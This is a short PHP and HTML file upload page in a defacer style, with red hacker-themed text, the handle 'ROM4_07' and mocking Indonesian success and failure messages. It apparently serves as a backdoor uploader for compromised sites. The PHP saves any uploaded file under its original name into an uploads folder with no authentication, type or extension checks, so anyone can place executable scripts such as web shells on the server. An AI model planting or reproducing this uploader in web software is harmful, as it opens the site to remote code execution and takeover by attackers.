
<html>
<head>
  <title>Upload your files</title>
  <style>
		font{
			font-familly:Orbitron;
  			text-align:center;
  			letter-spacing:1px;
 			color:red;
  			text-shadow: 5px 5px 8px white;
  		}
	</style>
</head>
<body background="http://i68.tinypic.com/1124ebn.jpg">
		
		<table height="100%" width="100%">
			<td>
				<center>
  					<form enctype="multipart/form-data" action="upload.php" method="POST">
    				<p><font size="5" color="red">Upload your file</font></p>
    				<input type="file" name="uploaded_file"></input>
    				<input type="submit" value="Gas Upload"></input>
  					</form>
  					<font color="black" size="3">Copyright @2019 ROM4_07</font>
  					</center>
			</td>
		</table>
</body>
</html>
<?php
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "uploads/";
    $path = $path . basename( $_FILES['uploaded_file']['name']);
    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " Sudah Di Upload Mas !!!";
    } else{
        echo "Gagal Upload Mas !!! HEHEHEHE...";
    }
  }
?>